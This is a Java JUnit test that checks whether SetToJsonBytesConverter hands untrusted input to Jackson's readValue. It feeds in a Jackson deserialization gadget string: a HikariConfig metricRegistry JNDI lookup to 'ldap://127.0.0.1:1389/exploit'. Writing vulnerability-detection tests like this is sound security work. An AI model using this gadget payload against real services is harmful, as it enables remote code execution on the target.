package demo.test.demo1test;

import org.junit.Test;
import static org.junit.Assert.assertTrue;

public class SetToJsonBytesConverterTest {

    @Test
    public void testVulnerabilityTriggered() {
        // Test input data
        String input = "[\"com.zaxxer.hikari.HikariConfig\",{\"metricRegistry\":\"ldap://127.0.0.1:1389/exploit\"}]";
        byte[] bytes = input.getBytes();
        // Intercept the vulnerable method call
        MethodCallInterceptor.interceptor(
            com.fasterxml.jackson.databind.ObjectMapper.class,
            "readValue",
            new Object[]{bytes}
        );

        try {
            // Call the function under test
            SetToJsonBytesConverter.convertBack(bytes); // Convert input to bytes
        } catch (Exception e) {
            // Exception caught, do nothing
        }

        // Assert that the vulnerability was successfully triggered
        assertTrue(MethodCallInterceptor.isTrigger);
    }
}
